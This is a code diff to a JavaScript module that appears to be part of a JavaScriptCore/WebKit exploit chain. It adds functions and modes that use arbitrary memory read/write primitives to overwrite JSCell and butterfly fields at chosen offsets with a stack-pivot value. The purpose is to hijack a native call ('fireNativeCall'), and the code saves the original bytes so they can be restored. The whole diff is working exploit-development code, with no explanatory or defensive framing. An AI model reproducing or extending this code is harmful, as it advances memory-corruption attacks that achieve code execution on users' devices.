@@ -678,6 +678,33 @@ export function bisectHookPivotButterfly(p, prep, hookOffs, carrier) {
     return saved;
 }
 
+/** Safe multi on cell + butterfly — one fire covers rsi=cell and rsi=butterfly layouts. */
+export function bisectHookPivotMultiAll(p, prep, cellOffs, bfOffs, carrier) {
+    if (!prep || !prep.pivotCell || !prep.M)
+        throw new Error("bisectHookPivotMultiAll: no prep");
+    cellOffs = cellOffs || G0_HOOK_SAFE;
+    bfOffs = bfOffs || G0_HOOK_SAFE;
+    if (!prep._bisect) prep._bisect = {};
+    const saved = [];
+    for (let i = 0; i < cellOffs.length; i++) {
+        const site = prep.pivotCell.add32(cellOffs[i]);
+        saved.push({ site, off: cellOffs[i], base: "cell", val: p.read8(site) });
+        p.write8(site, prep.M.S);
+    }
+    const bf = ensurePivotButterfly(p, prep, carrier);
+    if (bf) {
+        for (let j = 0; j < bfOffs.length; j++) {
+            const site = bf.add32(bfOffs[j]);
+            saved.push({ site, off: bfOffs[j], base: "bf", val: p.read8(site) });
+            p.write8(site, prep.M.S);
+        }
+        prep._bisect.butterfly = bf;
+    }
+    prep._bisect.multiSaved = saved;
+    prep._bisect.pivotSite = saved.length ? saved[0].site : prep.pivotCell;
+    return saved;
+}
+
 /** Verify hooks written to multiSaved sites (cell or butterfly). */
 export function verifyPivotHookSaved(p, prep) {
     const rows = [];
@@ -756,13 +783,23 @@ function writePivotHookDual(p, prep, off, carrier) {
 
 function applyPivotHook(p, prep, off, opts) {
     opts = opts || {};
-    const mode = opts.hook || "cell";
+    const mode = opts.hook || "cell30";
     const carrier = opts.carrier || null;
     if (mode === "dual") {
         writePivotHookDual(p, prep, off || {}, carrier);
         return;
     }
-    if (mode === "bf")
+    if (mode === "dual30") {
+        bisectHookPivotMultiAll(p, prep, [0x30], [0x30], carrier);
+        return;
+    }
+    if (mode === "multi")
+        bisectHookPivotMulti(p, prep, G0_HOOK_OFFS);
+    else if (mode === "multi-safe")
+        bisectHookPivotMulti(p, prep, G0_HOOK_SAFE);
+    else if (mode === "multiall")
+        bisectHookPivotMultiAll(p, prep, G0_HOOK_SAFE, G0_HOOK_SAFE, carrier);
+    else if (mode === "bf")
         bisectHookPivotButterfly(p, prep, G0_HOOK_POOPS, carrier);
     else if (mode === "bf30")
         bisectHookPivotButterfly(p, prep, [0x30], carrier);
@@ -771,6 +808,11 @@ function applyPivotHook(p, prep, off, opts) {
             : (opts.hookOff != null ? opts.hookOff : 0);
         bisectHookPivotAt(p, prep, hookOff);
     }
+}
+
+/** Pre-fire logging / bisect — same hooks fireNativeCall applies. */
+export function applyPivotHookForFire(p, prep, off, opts) {
+    applyPivotHook(p, prep, off, opts);
 }
 
 function restorePivotHook(p, prep) {
@@ -838,6 +880,9 @@ export const G0_HOOK_POOPS = [0x0];
 
 /** Offsets poisoned on pivotCell for G0 rsi layout hunt (can corrupt object — use N5multi only). */
 export const G0_HOOK_OFFS = [0x0, 0x20, 0x28, 0x30, 0x38];
+
+/** 13.52 — skip cell+0 (JSCell header); poison [rsi+0x30] when rsi=pivotCell or butterfly. */
+export const G0_HOOK_SAFE = [0x20, 0x28, 0x30, 0x38];
 
 /** Slab + arm checks before fire — throws instead of OOM when bufAddr is wrong. */
 export function bisectPreflight(p, prep) {
